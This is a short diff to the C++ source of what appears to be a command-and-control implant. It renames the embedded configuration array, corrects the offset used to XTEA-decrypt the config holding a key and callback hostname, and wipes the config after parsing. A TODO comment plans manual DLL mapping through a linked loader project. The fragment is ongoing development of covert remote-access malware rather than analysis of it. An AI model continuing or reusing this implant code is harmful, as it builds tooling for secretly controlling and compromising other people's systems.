@@ -1,6 +1,6 @@
 #include <core/include/implant.hpp>
 namespace Implant {
-    __text(F) uint8_t _config[CONFIG_SIZE] = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, };
+    __text(F) uint8_t __config[CONFIG_SIZE] = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, };
 
     VOID MainRoutine() {
 
@@ -139,14 +139,14 @@ namespace Implant {
         bool    success = true;
         _parser parser  = { };
 
-        Parser::CreateParser(&parser, _config, sizeof(_config));
-        x_memset(_config, 0, sizeof(_config));
+        Parser::CreateParser(&parser, __config, sizeof(__config));
+        x_memset(__config, 0, sizeof(__config));
 
         Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
         Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
 
         if (ENCRYPTED) {
-            Xtea::XteaCrypt(B_PTR(parser.buffer), parser.Length - 0x12, Ctx->config.key, FALSE);
+            Xtea::XteaCrypt(B_PTR(parser.buffer) + 0x12, parser.Length - 0x12, Ctx->config.key, FALSE);
         }
         // todo: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
 
